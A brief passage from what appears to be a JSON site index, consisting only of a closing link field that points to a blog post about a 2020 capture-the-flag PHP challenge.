","link":"https://scarecr0w7.github.io/post/ctfornpuctf2020readlezphp/"}]}